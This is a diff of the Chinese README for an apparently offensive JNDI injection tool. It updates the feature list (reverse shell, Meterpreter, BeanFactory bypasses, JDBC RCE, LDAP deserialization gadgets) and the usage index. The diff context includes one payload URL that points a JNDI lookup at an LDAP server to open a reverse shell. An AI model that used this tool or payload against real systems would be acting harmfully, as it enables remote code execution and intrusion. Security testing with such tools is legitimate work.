@@ -34,17 +34,34 @@ ldap://10.0.0.1:1389/Basic/ReverseShell/10.0.0.1/1337
 
 ## 🚩 功能特性
 
-- DNS Log
+- DNSLog
 - 命令执行
-- 原生反弹 Shell (支持 Windows)
-- 原生反弹 Meterpreter
-- 加载自定义 Class 字节码
-- Tomcat/Groovy/SnakeYaml/XStream/MVEL/BeanShell Bypass
-- Commons DBCP/Tomcat DBCP/Tomcat JDBC/Alibaba Druid/HikariCP JDBC RCE
-- NativeLibLoader 加载动态链接库
-- MLet 探测可用 Class
-- LDAP(s) 反序列化
-- 自定义 JNDI Payload (基于 Nashorn JS 引擎)
+- 反弹 Shell
+- Meterpreter 上线
+- 加载自定义 Java 字节码
+- Nashorn JS 自定义 Payload
+- BeanFactory Bypass
+  - Tomcat
+  - Groovy
+  - XStream
+  - SnakeYaml
+  - BeanShell
+  - MVEL
+  - MLet (探测 Java 类)
+  - NativeLibLoader (加载本地库)
+- JDBC RCE (MySQL、PostgreSQL、H2、Derby)
+  - Commons DBCP
+  - Tomcat DBCP
+  - Tomcat JDBC
+  - Alibaba Druid
+  - HikariCP
+- LDAP 反序列化:
+  - CommonsCollections K1-K4
+  - CommonsBeanutils183
+  - CommonsBeanutils194
+  - Jackson
+  - Fastjson1
+  - Fastjson2
 
 ## 📖 使用指南
 
@@ -52,15 +69,26 @@ ldap://10.0.0.1:1389/Basic/ReverseShell/10.0.0.1/1337
 
 - [Usage](USAGE.md#usage)
 - [Basic](USAGE.md#basic)
-- [Bypass](USAGE.md#bypass)
-- [MLet](USAGE.md#mlet)
-- [NativeLibLoader](USAGE.md#nativelibloader)
+- [JNDI URL 注意事项](USAGE.md#jndi-urls-注意事项)
+- [BeanFactory Bypass](USAGE.md#beanfactory-bypass)
+  - [Tomcat ELProcessor](USAGE.md#tomcat-elprocessor)
+  - [Groovy ClassLoader/Shell](USAGE.md#groovy-classloadershell)
+  - [XStream](USAGE.md#xstream)
+  - [SnakeYaml](USAGE.md#snakeyaml)
+  - [BeanShell](USAGE.md#beanshell)
+  - [MVEL](USAGE.md#mvel)
+  - [MLet](USAGE.md#mlet)
+  - [NativeLibLoader](USAGE.md#nativelibloader)
 - [JDBC RCE](USAGE.md#jdbc-rce)
   - [MySQL](USAGE.md#mysql)
+    - [MySQL JDBC 反序列化 RCE](USAGE.md#mysql-jdbc-反序列化-rce)
+    - [MySQL 客户端任意文件读取](USAGE.md#mysql-客户端任意文件读取)
   - [PostgreSQL](USAGE.md#postgresql)
   - [H2](USAGE.md#h2)
   - [Derby](USAGE.md#derby)
-- [Deserialize](USAGE.md#deserialize)
+    - [Derby SQL RCE](USAGE.md#derby-sql-rce)
+    - [Derby 主从复制反序列化 RCE](USAGE.md#derby-主从复制反序列化-rce)
+- [LDAP Deserialization](USAGE.md#ldap-deserialization)
 - [Script](USAGE.md#script)
 - [useReferenceOnly](USAGE.md#usereferenceonly)
 
